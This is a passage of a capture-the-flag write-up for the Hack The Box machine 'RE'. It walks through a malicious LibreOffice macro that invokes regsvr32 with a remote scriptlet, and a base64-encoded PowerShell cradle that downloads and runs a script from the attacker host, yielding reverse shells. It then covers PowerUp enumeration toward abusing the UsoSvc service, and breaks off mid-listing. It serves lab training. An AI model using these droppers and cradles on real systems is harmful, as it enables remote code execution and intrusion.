We google &lsquo;regsvr32 sct file&rsquo; to get the <a href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct">RegSvr32.sct</a> payload from atomic-red-team.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#8be9fd;font-style:italic">echo</span> IEX<span style="color:#f1fa8c">\(</span>new-object net.webclient<span style="color:#f1fa8c">\)</span>.downloadstring<span style="color:#f1fa8c">\(\&#39;</span>http://10.10.14.73:8080/iis.ps1<span style="color:#f1fa8c">\&#39;\)</span> | iconv -t utf-16le | base64 -w <span style="color:#bd93f9">0</span>
<span style="color:#8be9fd;font-style:italic">SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA</span><span style="color:#ff79c6">==</span>
</code></pre></td></tr></table>
</div>
</div><p>we edit the sct file :</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:~/htb$ cp RegSvr32.sct evil.sct
ctf@6274ae97a895:~/htb$ vi evil.sct
ctf@6274ae97a895:~/htb$ cat evil.sct
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
ctf@6274ae97a895:~/htb$ cat ods_regsrv32/Basic/Standard/Module1.xml
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>We modify the payload</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?XML version=&#34;1.0&#34;?&gt;</span>
<span style="color:#ff79c6">&lt;scriptlet&gt;</span>
<span style="color:#ff79c6">&lt;registration</span>
    <span style="color:#50fa7b">progid=</span><span style="color:#f1fa8c">&#34;PoC&#34;</span>
    <span style="color:#50fa7b">classid=</span><span style="color:#f1fa8c">&#34;{F0001111-0000-0000-0000-0000FEEDACDC}&#34;</span> <span style="color:#ff79c6">&gt;</span>
        <span style="color:#6272a4">&lt;!-- regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll --&gt;</span>

        <span style="color:#ff79c6">&lt;script</span> <span style="color:#50fa7b">language=</span><span style="color:#f1fa8c">&#34;JScript&#34;</span><span style="color:#ff79c6">&gt;</span>
                <span style="color:#ff79c6">&lt;![CDATA[
</span><span style="color:#ff79c6">                        // What you are hoping to catch is the cmdline, modloads, or network connections, or any variation
</span><span style="color:#ff79c6">                        var r = new ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;powershell -encodedcommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA==&#34;);
</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">                ]]&gt;</span>
<span style="color:#ff79c6">&lt;/script&gt;</span>
<span style="color:#ff79c6">&lt;/registration&gt;</span>
<span style="color:#ff79c6">&lt;/scriptlet&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We modify the ods file Module and zip it into file regsrv32.ods</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span style="color:#ff79c6">&lt;!DOCTYPE script:module PUBLIC &#34;-//OpenOffice.org//DTD OfficeDocument 1.0//EN&#34; &#34;module.dtd&#34;&gt;</span>
<span style="color:#ff79c6">&lt;script:module</span> <span style="color:#50fa7b">xmlns:script=</span><span style="color:#f1fa8c">&#34;http://openoffice.org/2000/script&#34;</span> <span style="color:#50fa7b">script:name=</span><span style="color:#f1fa8c">&#34;Module1&#34;</span> <span style="color:#50fa7b">script:language=</span><span style="color:#f1fa8c">&#34;StarBasic&#34;</span> <span style="color:#50fa7b">script:moduleType=</span><span style="color:#f1fa8c">&#34;normal&#34;</span><span style="color:#ff79c6">&gt;</span>REM  *****  BASIC  *****

Sub Main
    a = &amp;quot;regsvr32 /s /u /i:http://10.10.14.73:8080/evil.sct scrobj.dll&amp;quot;
        Shell(a)
End Sub
<span style="color:#ff79c6">&lt;/script:module&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>After uploading the ods file with smbclient, we see evil.sct then iis.ps1 being downloaded by the victim. and a shell is given:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:~/htb$ rlwrap nc -lnvp <span style="color:#bd93f9">8001</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8001</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">65326</span>
Windows PowerShell running as user luke on RE
Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.

PS C:<span style="color:#f1fa8c">\P</span>rogram Files<span style="color:#f1fa8c">\L</span>ibreOffice<span style="color:#f1fa8c">\p</span>rogram&gt;whoami
re<span style="color:#f1fa8c">\l</span>uke
</code></pre></td></tr></table>
</div>
</div><p>We connect <a href="http://re.htb/antak.aspx">http://re.htb/antak.aspx</a> then we execute</p>
<pre tabindex="0"><code>&quot;powershell -encodedcommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA==&quot;
</code></pre><p>to connect a remote TCP Shell on port 8001</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:~/htb$ rlwrap nc -lnvp <span style="color:#bd93f9">8001</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8001</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">65337</span>
Windows PowerShell running as user RE$ on RE
Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.

PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt;whoami
iis apppool<span style="color:#f1fa8c">\r</span>e
PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami /all
Group Name                           Type             SID          <span style="color:#8be9fd;font-style:italic">Attributes</span>
<span style="color:#ff79c6">====================================</span> <span style="color:#ff79c6">================</span> <span style="color:#ff79c6">============</span> <span style="color:#ff79c6">==================================================</span>
NT AUTHORITY<span style="color:#f1fa8c">\S</span>ERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>For this exploit, it is key that the user belongs to NT AUTHORITY\SERVICE group</p>
<p>We can compile on a windows box:</p>
<ul>
<li><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></li>
<li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS.exe</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit.git">PowerUp</a></li>
</ul>
<p>We will simply use PowerUp:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ctf@6274ae97a895:/opt$ find . | grep -i Powerup
./PowerSploit/Privesc/PowerUp.ps1
ctf@6274ae97a895:/opt$ cp ./PowerSploit/Privesc/PowerUp.ps1 ~/htb/http/
</code></pre></td></tr></table>
</div>
</div><p>On our powershell, we seek for a writable directory to execute our TCP reverse shell.
It is better to use IEX then wget because it will execute the PowerUp.ps1 script.
Note the PowerUp.ps1 script does not execute anything, it simply load some modules that we have to invoke such as <code>Invoke-AllChecks</code>;</p>
<p>We have permissions to play with UsoSvc: Service Abuse Overwritting</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; <span style="color:#8be9fd;font-style:italic">cd</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>PS C:<span style="color:#f1fa8c">\&gt;</span> <span style="color:#8be9fd;font-style:italic">cd</span> users
PS C:<span style="color:#f1fa8c">\u</span>sers&gt; <span style="color:#8be9fd;font-style:italic">cd</span> public
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Documents
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\D</span>ocuments&gt; <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;test&#39;</span> &gt; <span style="color:#8be9fd;font-style:italic">test</span>
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\D</span>ocuments&gt; rm <span style="color:#8be9fd;font-style:italic">test</span>
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; IEX<span style="color:#ff79c6">(</span>new-object net.webclient<span style="color:#ff79c6">)</span>.downloadstring<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;http://10.10.14.73:8080/PowerUp.ps1&#39;</span><span style="color:#ff79c6">)</span>
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; Invoke-AllChecks
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\D</span>ocuments&gt; wget -o PowerUp.ps1 http://10.10.14.73:8080/PowerUp.ps1

<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Checking service permissions...


ServiceName   : UsoSvc
Path          : C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\s</span>vchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name <span style="color:#f1fa8c">&#39;UsoSvc&#39;</span>
CanRestart    : True

<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; cmd /c <span style="color:#f1fa8c">&#34;sc query UsoSvc&#34;</span>

SERVICE_NAME: UsoSvc
        TYPE               : <span style="color:#bd93f9">20</span>  WIN32_SHARE_PROCESS
        STATE              : <span style="color:#bd93f9">4</span>  RUNNING
                                <span style="color:#ff79c6">(</span>STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN<span style="color:#ff79c6">)</span>
        WIN32_EXIT_CODE    : <span style="color:#bd93f9">0</span>  <span style="color:#ff79c6">(</span>0x0<span style="color:#ff79c6">)</span>
        SERVICE_EXIT_CODE  : <span style="color:#bd93f9">0</span>  <span style="color:#ff79c6">(</span>0x0<span style="color:#ff79c6">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\p</span>ublic<span style="color:#f1fa8c">\d</span>ocuments&gt; cmd /c <span style="color:#f1fa8c">&#34;sc qc UsoSvc&#34;</span>
<span style="color:#ff79c6">[</span>SC<span style="color:#ff79c6">]</span> QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : <span style="color:#bd93f9">20</span>  WIN32_SHARE_PROCESS
        START_TYPE         : <span style="color:#bd93f9">2</span>   AUTO_START  <span style="color:#ff79c6">(</span>DELAYED<span style="color:#ff79c6">)</span>
        ERROR_CONTROL      : <span style="color:#bd93f9">1</span>   NORMAL
        BINARY_PATH_NAME   : C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\s</span>vchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   :
        TAG                : <span style="color:#bd93f9">0</span>
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
</code></pre></td></tr></table>
</div>
</div><p>Now, we have the BINARY_PATH_NAME of the service to perform the service abuse overwriting and create the user john</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
